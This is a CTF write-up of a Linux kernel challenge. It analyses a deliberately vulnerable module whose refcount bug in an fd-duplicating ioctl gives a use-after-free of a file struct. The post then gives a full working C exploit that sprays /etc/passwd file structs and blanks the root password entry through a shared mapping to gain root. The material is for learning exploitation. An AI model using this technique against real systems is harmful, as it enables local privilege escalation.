+++
title="A \"Gau-Hack\" from EuskalHack"
date=2024-06-30

[taxonomies]
tags = ["fd", "kernel", "linux", "uaf"]
+++

This is a kernel exploitation challenge created by [@javierprtd](https://x.com/javierprtd).

In this challenge, we are given the source code of a vulnerable LKM (`ctf.c`), its Makefile and some code in C as a proof of concept on how to interact with the LKM (`poc.c`).

To be able to debug this LKM, we need a kernel image (I used `linux-6.6.34`), and a file system (I modified an `initramfs` image from an older CTF challenge).

This is the bash script used to run the kernel image within QEMU:

```bash
#!/bin/bash

qemu-system-x86_64 \
    -cpu kvm64,+smep,+smap \
    -m 256M \
    -nographic \
    -kernel bzImage-6.6.34 \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr' \
    -monitor /dev/null \
    -initrd initramfs.cpio.gz \
    -s
```

The `init` file used within `initramfs` is the following:

```bash
#!/bin/sh

chown -hR root: /
chown -R user: /home/user

chmod 0755 -R /
chmod 0700 -R /root/
chmod 0 /flag
chmod u+s /bin/su

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts

/sbin/mdev -s

# Disable boot at kernel panic
echo "kernel.panic = 0" > /etc/sysctl.conf
sysctl -p

# ifup eth0 >& /dev/null

cd /root
cat /etc/banner.txt

insmod /chall/ctf.ko

cd /home/user
# final mode
setsid cttyhack setuidgid 1000 sh
# test mode
# setsid cttyhack setuidgid 0 sh

poweroff -f
```

And to update the compressed `initramfs` image, I use the following script:

```bash
gcc -o exploit -static $1
gcc -o poc -static poc.c
cp ./exploit ./initramfs/home/user
cp ./poc ./initramfs/home/user
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
```

## Source Code Analysis
If we check the provided source code for the vulnerable LKM, we can identify two main functions within ioctl:

```c
static long ctf_ioctl(struct file *file, unsigned int code, unsigned long arg) {

    switch (code) {
        case IOCTL_CTF_INSTALL_FILE:
            return install_file((int * __user) arg);

        case IOCTL_CTF_CLOSE_FILE:
            return close_file((int * __user) arg);

        default:
            return -EINVAL;
    }

}
```

### install_file
We can see below the content of the `install_file` function:

```c
int install_file(int * __user arg) {

	int ret = 0;
	int fd;
	struct files_struct *files;
	struct file *file;
	struct fdtable *fdt;
	
	if (copy_from_user(&fd, arg, sizeof(int))) {
		pr_err("error copy_from_user\n");
		return -EFAULT;
	}
 
	files = current->files;
	
	spin_lock(&files->file_lock);
	
	fdt = files_fdtable(files);

	if (fd >= fdt->max_fds)
		return -EBADF;

	file = fdt->fd[fd];
	
	spin_unlock(&files->file_lock);

	ret = get_unused_fd_flags(0);
	
	if (ret < 0) {
		goto error;
	}
	
	get_file(file);
	
	fd_install(ret, file);
	
	return ret;
	
error:
	fput(file);
	return -EBADF;
}
```

Overall, we can say this function is pretty similar to a `dup` syscall.

If we look closely, we can see that this function initially receives a file descriptor from the user-space, then it gets the current process _files_struct_ structure and later it locks the _files_struct_ struct.

Inside the lock, it retrieves the file descriptor table of the process, checks if the given file descriptor is valid and retrieves the _file_ struct that corresponds to the given file descriptor. The _files_struct_ lock is released after this part.

After the lock release, a new file descriptor is allocated with `get_unused_fd_flags(0)`, the `file->f_count->counter` (from now on, `f_count`)  is incremented by one and finally, the file descriptor is associated with the _file_ struct in the file descriptor table of the running process.

The error management just decrements `f_count` by one with `fput(file)` and returns `EBADF`. This part is pretty interesting as we will see later on.

### close_file
We can see the below the content of the `close_file` function:

```c
int close_file(int * __user arg) {

	int fd;
	struct files_struct *files;
	struct file *file;
	struct fdtable *fdt;

	if (copy_from_user(&fd, arg, sizeof(int))) {
		pr_err("error copy_from_user\n");
		return -EFAULT;
	}

	files = current->files;

	spin_lock(&files->file_lock);
	
	fdt = files_fdtable(files);

	if (fd >= fdt->max_fds)
		return -EBADF;

	file = fdt->fd[fd];
	
	spin_unlock(&files->file_lock);
	
	if (file) {
		rcu_assign_pointer(fdt->fd[fd], NULL);
		
		__clear_bit(fd, fdt->open_fds);
		__clear_bit(fd / BITS_PER_LONG, fdt->full_fds_bits);
		
		if (fd < files->next_fd)
			files->next_fd = fd;
	}
	
	return filp_close(file, files);
}
```

This function is very similar to `close` syscall.

Until the _files_struct_ lock release, this function behaves the same way as `install_file` does.

After the lock release, the given file descriptor is set to `NULL` and its corresponding bits are cleared in the bitmap. Later checks if it is necessary to update `next_fd` from _files_struct_. 

Finally, the file struct `f_count` is decremented with `filp_close(file, files)`.

## Exploit Strategy

By the time I started this challenge I had very little idea on how this could be exploited and I did some research where I could find this could technically be exploited through race conditions between the file description is assigned to the file struct and the new file descriptor is returned to the user. This can be checked [here](https://i.blackhat.com/USA-22/Wednesday/US-22-Wu-Devils-Are-in-the-File.pdf).

However, the intended solve is easier. If we check the error management of the `get_unused_fd_flags(0)` function within `install_file`, we can see there is something off.

The important fragment of code is the following:

```c
	ret = get_unused_fd_flags(0);
	
	if (ret < 0) {
		goto error;
	}
	
	get_file(file);

	...
error:
	fput(file);
	return -EBADF;
```

If we can force `get_unused_fd_flags(0)` to fail, the _file_ struct `f_count` will be decremented. This is a problem because at this moment, the `f_count` still has not been modified as it is incremented in `get_file(file)` function. This would allow us to decrement a file's `f_count` at our will, which by the time it reaches `0`, the _file_ struct will be released/freed giving us a UAF primitive.

But how can we force `get_unused_fd_flags(0)` to fail? There's a command called `prlimit` that modifies the resource limits of a given process. In `C`, we can use `prlimit` or `setprlimit` to modify the max number of open files (`RLIMIT_NOFILE`) a process can have. If we reach this limit, `get_unused_fd_flags(0)` will always return an error.

Now that we have identified the UAF primitive, we can desing a proper strategy to exploit it. To do so, we will go through the following steps:

1. **Create a temporary file**: create a file with `O_RDWR` permissions.
2. **Map the temporary file**: map the file into memory with `PROT_READ` and `PROT_WRITE` protections and the `MAP_SHARED` flag. This way we will be able to write into the desired file after leveraging the UAF primitive.
3. **Drop `f_count` to `0`**: drop the file's `f_count` to `0` using the previously explained method so the file's _file_ struct is released/freed.
4. **`/etc/passwd` spraying**: spray _file_ structs pointing to critical files like `/etc/passwd`. If we manage to allocate one of these _file_ structs where the previous _file_ struct was freed, we can leverage the UAF into an arbitrary read/write.
5. **Overwrite `/etc/passwd`**: As the pages of the mapped region are allowed to be written, we can write into the mapped `/etc/passwd` and the changes will be carried through to the underlying file due to the `MAP_SHARED` flag.
6. **Avoid kernel memory problems**: Find a way to avoid problems with the messed kernel memory.
7. **Have fun :)**

## Exploit Development

To develop a cleaner exploit, we can use the following helper functions:

```c
// ioctl IOCTL_CTF_INSTALL_FILE wrapper.
int install_file(int device_fd, int *fd) {
	
	int installed_fd = ioctl(device_fd, IOCTL_CTF_INSTALL_FILE, fd);
	if (installed_fd < 0) {
		warn("[!] IOCTL_CTF_INSTALL_FILE failed");
	}

	return installed_fd;
}

// ioctl IOCTL_CTF_CLOSE_FILE wrapper.
void close_file(int device_fd, int *fd) {
	
	int res = ioctl(device_fd, IOCTL_CTF_CLOSE_FILE, fd);
	if (res < 0) {
		err(0, "[-] IOCTL_CTF_INSTALL_FILE failed");
	}
	
	return;
}

// Limits the available amount of open files handable by the current process.
void set_fd_limit(int cur, int max) {

	struct rlimit new, old;
	new.rlim_cur = cur;
	new.rlim_max = max;

	int res = prlimit(getpid(), RLIMIT_NOFILE, &new, &old);
	if (res < 0) {
		err(0, "[-] prlimit failed\n");
	}
	
	printf("[+] RLIMIT_NOFILE set to:\n[+]\trlim_cur = %d\n[+]\trlim_max = %d\n", cur, max);

	return;
}
```

### Create a temporary file
Once we have created these helper functions, we can start with the actual exploit.
Firstly, we need to open the LKM and a temporary file that will be the one used to trigger the UAF. This can be achieved the following way:

```c
	// Opening LKM.
	puts("[+] Opening LKM");
	device_fd = open(DEVICE_FILE, O_RDONLY);
	if (device_fd < 0) {
		err(0, "[-] Failed to open device file");
	}

	// Opening tmp file.
	puts("[+] Opening tmp file");
	fd0 = open(TMP_FILE, O_CREAT | O_RDWR, 0666);
	if (fd0 < 0) {
		err(0, "[-] Failed to open %s", TMP_FILE);
	}
```

### Map the temporary file
The next step is to map the previously opened temporary file into memory. This way we can get access to the file with a single pointer instead of going through a file descriptor. This mapping must allow read and write access and must have the `MAP_SHARED` flag set. This way any change in the mapped file will be carried through to the underlying file.

We must take into account that if we want to access an empty mapped file, we will receive a `bus error` as we will be accessing beyond the file's end. To avoid this later on, we can write a placeholder to the file.

```c
	// Allocating some bytes into tmp file to prevent bus error.
	// fallocate or ftruncate are other viable options.
	puts("[+] Allocating some bytes into tmp file to prevent bus error");
	write(fd0, placeholder, strlen(placeholder));

	// Mapping tmp file into memory.
	// Size 1 allocates minimum size which is an entire page.
	puts("[+] Mapping tmp file into memory");
	ptr = mmap(NULL, 1, PROT_READ | PROT_WRITE, MAP_SHARED, fd0, 0);
	if (ptr == MAP_FAILED) {
		err(0, "[-] Failed to map %s into memory", TMP_FILE);
	}
```

### Drop `f_count` to `0`
Now the `f_count` related to our temporary file should have a value of `2` as the mapping has increased the previous value by one.

Our next goal is to force `get_unused_fd_flags(0)` to fail. As we explained before, this can be achieved by limiting the max amount of open files a process can have. We will use the previously defined wrapper for the `prlimit` function.

```c
	// Limiting the max amount of file descriptors.
	puts("[+] Limiting max amount of file descriptors");
	set_fd_limit(0, 4096);	
```

Here we are setting the soft limit at `0` and the hard limit at `4096`. This way any attempt to open a new file descriptor will fail.

As we said before, the actual value of `f_count` is `2` so this means we need to call `install_file` two consecutive times to drop this value to `0`. This will release the _file_ struct and the memory region will be freed.

```c
	// Forcing file struct release through file->f_count->counter decrement. 
	puts("[+] Forcing file struct release. Expecting EBADF:");
	fd1 = install_file(device_fd, &fd0);
	fd1 = install_file(device_fd, &fd0);
```

At this point, we can check what happens with the `f_count`. To be able to put a breakpoint at the `install_file` function of the LKM, we will need to load the LKM symbols into gdb. 

To load the LKM symbols, we need to find the address of the `.text` section of the LKM inside the emulator:

```
/home/user # cat /sys/module/ctf/sections/.text
0xffffffffc0203000
```

Later, to load the symbols, we can do the following in gdb:

```
pwndbg> target remote :1234
...
pwndbg> add-symbol-file initramfs/chall/ctf.ko 0xffffffffc0203000
add symbol table from file "initramfs/chall/ctf.ko" at
	.text_addr = 0xffffffffc0203000
Reading symbols from initramfs/chall/ctf.ko...
pwndbg> b install_file
Breakpoint 1 at 0xffffffffc0203070: file /home/bepernapat/CTF/EuskalHack/initramfs/chall/ctf.c, line 14.
```

The first time we reach the breakpoint, if we execute the instructions one by one, we can see how `get_unused_fd_flags(0)` fails and we jump to the error management part. Here we can check how the `f_count` is decremented:

```
─────[ SOURCE (CODE) ]───── 
   52 error:
 ► 53         fput(file);
   54         return -EBADF;
   55 }
───────────────────────────
pwndbg> p file->f_count
$1 = {
  counter = 2
}
pwndbg> n

─────[ SOURCE (CODE) ]───── 
   52 error:
   53         fput(file);
 ► 54         return -EBADF;
   55 }
───────────────────────────
pwndbg> p file->f_count
$2 = {
  counter = 1
}
```

The following time we hit the breakpoint, we can see how the `f_count` drops to `0` and the _file_ struct is released/freed:

```
─────[ SOURCE (CODE) ]───── 
   52 error:
 ► 53         fput(file);
   54         return -EBADF;
   55 }
───────────────────────────
pwndbg> p file->f_count
$3 = {
  counter = 1
}
pwndbg> n

─────[ SOURCE (CODE) ]───── 
   52 error:
   53         fput(file);
 ► 54         return -EBADF;
   55 }
───────────────────────────
pwndbg> p file->f_count
$4 = {
  counter = 0
}
```

### `/etc/passwd` spraying
Now that the _file_ struct has been released, we need to fill this freed space with a _file_ struct pointing to a critical file. In this case, we spray with _file_ structs pointing to `/etc/passwd`.  

```c
	// Spray to fill the previously freed file struct with a /etc/passwd file struct. 
	puts("[+] Spraying file structs pointing to /etc/passwd");
	for(int i = 0; i < 512; i++) {
		fd_spray[i] = open("/etc/passwd", O_RDONLY);
       		if (fd_spray[i] < 0) {
                	err(0, "[-] Failed to spray /etc/passwd");
        	}
	}
```

By the time a _file_ struct fills the previously freed space, we will be able to read and write `/etc/passwd` as these are the permissions we set when we first mapped the temporary file into memory.

To check if the spraying has successfully finished, we can print the memory region we mapped at the beginning of the exploit. If the printed output is the content of `/etc/passwd`, the spraying has successfully finished. Otherwise, we'll see the content of the placeholder we set at the beginning.

```c
	// Checking for successful UAF.
	puts("[+] Checking for successful UAF. Content should be from /etc/passwd:");
	fputs(ptr, stdout);
```

### Overwrite `/etc/passwd`
After the last check is completed, we can overwrite the first line of `/etc/passwd` with our custom value:
```c
	// Overwriting /etc/passwd root entry.
	puts("[+] Overwriting /etc/passwd root entry. Content should have been modified:");
	memcpy(ptr, privesc, strlen(privesc));
	fputs(ptr, stdout);
```

### Avoid kernel memory problems
At this moment, we have successfully completed the UAF exploitation by writing to an arbitrary file. However, during this process, we have messed up with the kernel memory, and this leads to kernel panic after running `su root` and some other commands.

By the time a process ends, it decrements the `f_count` of all the file descriptors in its file descriptor table. As there are two file descriptors pointing to the same file struct, it could be creating a double free which ends in kernel panic. However, after fixing this, it keeps breaking for some other reason.

After some time, we can find a good solution. It is not the cleanest way of solving the problem, but it definitely works. We can fork at the beginning of the exploit, wait until the corruption process ends, and finally run the `su root` command from the clean process so we don't have to mess with bad kernel memory:

```c
	puts("[+] Fork & wait for success");
	pid = fork();
	if(pid == -1) {
		err(0, "[-] Failed to fork for a new process");
	}
	else if(pid == 0) {
		
		// Waiting for corruption completion.
		sleep(3);
	
	 	// Changing user to root.
		char *argvx[3] = { "/bin/su", "root", NULL };
		execve("/bin/su", &argvx, NULL);
		
		// Should never be reached.
		return 1;
	}
	...

		// Entering eternal loop.	
	puts("[+] Corruption process has been completed. Waiting for a root shell...");
	while(1) {
		sleep(10);
	}
```

### Have fun :)
Time to have fun! Now we can elevate our privileges to root and do whatever we want:
```
/home/user $ id
uid=1000(user) gid=1000(user) groups=1000(user)
/home/user $ ./exploit
[+] Fork & wait for success
[+] Opening LKM
[+] Opening tmp file
[+] Allocating some bytes into tmp file to prevent bus error
[+] Mapping tmp file into memory
[+] Limiting max amount of file descriptors
[+] RLIMIT_NOFILE set to:
[+]     rlim_cur = 0
[+]     rlim_max = 4096
[+] Forcing file struct release. Expecting EBADF:
exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
[+] Extending max amount of file descriptors
[+] RLIMIT_NOFILE set to:
[+]     rlim_cur = 4096
[+]     rlim_max = 4096
[+] Spraying file structs pointing to /etc/passwd
[+] Checking for successful UAF. Content should be from /etc/passwd:
root:x:0:0:root:/root:/bin/sh
user:x:1000:1000:user:/home/user:/bin/sh
[+] Overwriting /etc/passwd root entry. Content should have been modified:
root::0:0:root:/root:/bin/ash
user:x:1000:1000:user:/home/user:/bin/sh
[+] Corruption process has been completed. Waiting for a root shell...
/home/user # id
uid=0(root) gid=0(root) groups=0(root)
/home/user # ls -l /flag
----------    1 root     root            27 Jun 22 11:03 /flag
/home/user # cat /flag
CTF{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

## Final Exploit

```c
/* Tested on Linux 6.6.34

/home/user $ id
uid=1000(user) gid=1000(user) groups=1000(user)
/home/user $ ./exploit
[+] Fork & wait for success
[+] Opening LKM
[+] Opening tmp file
[+] Allocating some bytes into tmp file to prevent bus error
[+] Mapping tmp file into memory
[+] Limiting max amount of file descriptors
[+] RLIMIT_NOFILE set to:
[+]	rlim_cur = 0
[+]	rlim_max = 4096
[+] Forcing file struct release. Expecting EBADF:
exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
[+] Extending max amount of file descriptors
[+] RLIMIT_NOFILE set to:
[+]	rlim_cur = 4096
[+]	rlim_max = 4096
[+] Spraying file structs pointing to /etc/passwd
[+] Checking for successful UAF. Content should be from /etc/passwd:
root:x:0:0:root:/root:/bin/sh
user:x:1000:1000:user:/home/user:/bin/sh
[+] Overwriting /etc/passwd root entry. Content should have been modified:
root::0:0:root:/root:/bin/ash
user:x:1000:1000:user:/home/user:/bin/sh
[+] Corruption process has been completed. Waiting for a root shell...
/home/user # id
uid=0(root) gid=0(root) groups=0(root)
/home/user #

*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <err.h>
#include <sys/ioctl.h>
#include <string.h>
#include <pthread.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <string.h>


#define IOCTL_CTF_INSTALL_FILE	_IOWR('s', 0x41, int)
#define IOCTL_CTF_CLOSE_FILE	_IOWR('s', 0x42, int)
#define DEVICE_FILE "/dev/ctf"
#define TMP_FILE "/home/user/tmp"

// ioctl IOCTL_CTF_INSTALL_FILE wrapper.
int install_file(int device_fd, int *fd) {
	
	int installed_fd = ioctl(device_fd, IOCTL_CTF_INSTALL_FILE, fd);
	if (installed_fd < 0) {
		warn("[!] IOCTL_CTF_INSTALL_FILE failed");
	}

	return installed_fd;
}

// ioctl IOCTL_CTF_CLOSE_FILE wrapper.
void close_file(int device_fd, int *fd) {
	
	int res = ioctl(device_fd, IOCTL_CTF_CLOSE_FILE, fd);
	if (res < 0) {
		err(0, "[-] IOCTL_CTF_INSTALL_FILE failed");
	}
	
	return;
}

// Limits the available amount of open files handable by the current process.
void set_fd_limit(int cur, int max) {

	struct rlimit new, old;
	new.rlim_cur = cur;
	new.rlim_max = max;

	int res = prlimit(getpid(), RLIMIT_NOFILE, &new, &old);
	if (res < 0) {
		err(0, "[-] prlimit failed\n");
	}
	
	printf("[+] RLIMIT_NOFILE set to:\n[+]\trlim_cur = %d\n[+]\trlim_max = %d\n", cur, max);

	return;
}

int main(int argc, char *argv[]) {
	
	const char *placeholder = "Looks like it does not work properly D:\n";
	const char *privesc = "root::0:0:root:/root:/bin/ash";
	int pid = -1;
	int fd0, fd1, device_fd;
	int fd_spray[512];
	void *ptr;

	puts("[+] Fork & wait for success");
	pid = fork();
	if(pid == -1) {
		err(0, "[-] Failed to fork for a new process");
	}
	else if(pid == 0) {
		
		// Waiting for corruption completion.
		sleep(3);
	
	 	// Changing user to root.
		char *argvx[3] = { "/bin/su", "root", NULL };
		execve("/bin/su", &argvx, NULL);
		
		// Should never be reached.
		return 1;
	}

	// Opening LKM.
	puts("[+] Opening LKM");
	device_fd = open(DEVICE_FILE, O_RDONLY);
	if (device_fd < 0) {
		err(0, "[-] Failed to open device file");
	}

	// Opening tmp file.
	puts("[+] Opening tmp file");
	fd0 = open(TMP_FILE, O_CREAT | O_RDWR, 0666);
	if (fd0 < 0) {
		err(0, "[-] Failed to open %s", TMP_FILE);
	}

	// Allocating some bytes into tmp file to prevent bus error.
	// fallocate or ftruncate are other viable options.
	puts("[+] Allocating some bytes into tmp file to prevent bus error");
	write(fd0, placeholder, strlen(placeholder));

	// Mapping tmp file into memory.
	// Size 1 allocates minimum size which is an entire page.
	puts("[+] Mapping tmp file into memory");
	ptr = mmap(NULL, 1, PROT_READ | PROT_WRITE, MAP_SHARED, fd0, 0);
	if (ptr == MAP_FAILED) {
		err(0, "[-] Failed to map %s into memory", TMP_FILE);
	}

	// Limiting the max amount of file descriptors.
	puts("[+] Limiting max amount of file descriptors");
	set_fd_limit(0, 4096);	

	// Forcing file struct release through file->f_count->counter decrement. 
	puts("[+] Forcing file struct release. Expecting EBADF:");
	fd1 = install_file(device_fd, &fd0);
	fd1 = install_file(device_fd, &fd0);

	// Extending max amount of file descriptors.
	puts("[+] Extending max amount of file descriptors");
	set_fd_limit(4096, 4096);	

	// Spray to fill the previously freed file struct with a /etc/passwd file struct. 
	puts("[+] Spraying file structs pointing to /etc/passwd");
	for(int i = 0; i < 512; i++) {
		fd_spray[i] = open("/etc/passwd", O_RDONLY);
       		if (fd_spray[i] < 0) {
                	err(0, "[-] Failed to spray /etc/passwd");
        	}
	}
	
	// Checking for successful UAF.
	puts("[+] Checking for successful UAF. Content should be from /etc/passwd:");
	fputs(ptr, stdout);

	// Overwriting /etc/passwd root entry.
	puts("[+] Overwriting /etc/passwd root entry. Content should have been modified:");
	memcpy(ptr, privesc, strlen(privesc));
	fputs(ptr, stdout);


	// Entering eternal loop.	
	puts("[+] Corruption process has been completed. Waiting for a root shell...");
	while(1) {
		sleep(10);
	}
	
	return 0;
}
```
{% admonition(type="note", title="note") %}
If you find a misconception or an error in any of my posts, please [contact me](mailto:gum3t@proton.me) and I'll fix it asap.
{% end %}
